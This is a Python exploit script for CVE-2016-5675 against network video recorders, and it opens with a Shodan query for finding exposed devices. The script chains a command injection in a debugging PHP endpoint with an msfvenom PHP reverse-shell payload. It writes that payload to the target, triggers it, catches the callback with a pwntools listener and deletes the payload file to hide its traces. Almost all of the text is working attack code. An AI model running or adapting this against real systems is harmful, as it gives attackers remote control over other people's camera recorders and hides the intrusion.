#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
# Shodan : title:"Network Video Recorder" X-Powered-By: PHP/5.6.13
import argparse
import requests
import subprocess
import threading
import sys
from pwn import *
parser = argparse.ArgumentParser()
parser.add_argument("--target", required=True, help="target", dest="target")
parser.add_argument("--lhost", required=True, help="lhost", dest="lhost")
parser.add_argument("--lport", required=True, help="lport", dest="lport")
args = parser.parse_args()
def banner():
 print """\033[1;33m
                                                                          
 _____ _____ _____    _____ _____ _ _ _ _____    
|   | |  _  |   __|  |   | |  _  | | | |_   _| 
| | | |     |__   |  | | | |     | | | | | |
|_|___|__|__|_____|  |_|___|__|__|_____| |_|
                               
        _____ _____ _____ ____  
       |   __|     |     |    \ 
       |  |  |  |  |  |  |  |  |
       |_____|_____|_____|____/\033[1;m
             \033[1;37mCVE-2016-5675\033[1;m"""

def create_payload(TARGET, LHOST, LPORT):
 banner()
 log.info("Generating payload..")
 payload = subprocess.Popen(["msfvenom", "-p", "php/reverse_php", "LHOST="+LHOST, "LPORT="+LPORT, "-f", "raw", "-e", "php/base64", "-i", "2"], stdout=subprocess.PIPE)
 payload = payload.stdout.read()
 cmd = "<?php " + payload + " ?>"
 cmd = "echo \"" + cmd + "\" > payload.php"
 shell_me = threading.Thread(target=request_shell, args=(TARGET, cmd))
 shell_me.daemon = True
 shell_me.start()
 try:
  l = listen(int(LPORT))
  l.wait_for_connection()
  log.success("Removing payload.php")
  l.sendline("rm -rf payload.php\n")
  l.interactive(pwnlib.term.init())
 except Exception as e:
  log.warning(e)
def request_shell(TARGET, cmd):
 try:
  log.info("Creating payload on target")
  name = cyclic(20)
  req = requests.get("http://"+TARGET+"/__debugging_center_utils___.php?log="+name+";"+cmd)
  log.info("Triggering payload")
  pay_trigger = requests.get("http://"+TARGET+"/payload.php")
  if pay_trigger.status_code != 200:
   log.warning("Payload unable to be triggered")
   sys.exit()
 except Exception as e: log.info("Request failed, with " + e)
create_payload(args.target, args.lhost, args.lport)
